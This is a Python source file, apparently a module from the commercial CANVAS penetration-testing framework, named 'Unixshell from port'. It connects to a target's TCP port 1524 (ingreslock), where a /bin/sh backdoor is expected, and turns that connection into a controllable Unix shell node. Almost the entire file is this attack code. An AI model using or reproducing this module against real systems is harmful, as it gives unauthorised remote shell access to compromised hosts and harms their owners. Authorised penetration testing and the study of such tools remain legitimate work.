#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import unixShellNode


NAME="Unixshell from port"
DESCRIPTION="Tries to connect to a host and port and convert that into a Unix Shell Server"
DOCUMENTATION={}
DOCUMENTATION["notes"]="""Use this if you've got a /bin/sh listening on your target's ingreslock port, for example"""
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Unix"] ]

NOTES="""
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=1524
        self.host=""
        self.setVersions()
        self.version=1
        
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Unix (generic)",None)
    
    def test(self):
        """
        
        """
        if self.argsDict.get("singleshot") == True:
            self.log("Not running test, because we're single shot")
            return 1
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        try:
            
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except socket.error:
            self.log("backdoor connection not successful.")
            self.setProgress(-1)
            return 0

            
        telnetshell=Telnet()
        telnetshell.sock=s
            

        self.setProgress(80)
        try:
            shell=shelllistener(shellfromtelnet(telnetshell),logfunction=self.logfunction)
        except :
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            self.setProgress(-1)
            return 0
        
        node=unixShellNode.unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]        
        #shell=shelllistener(shellfromtelnet(tn))
        node.shell=shell
        self.setInfo("%s attacking %s:%d (success!)"%(NAME,self.host,self.port))
        return node


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
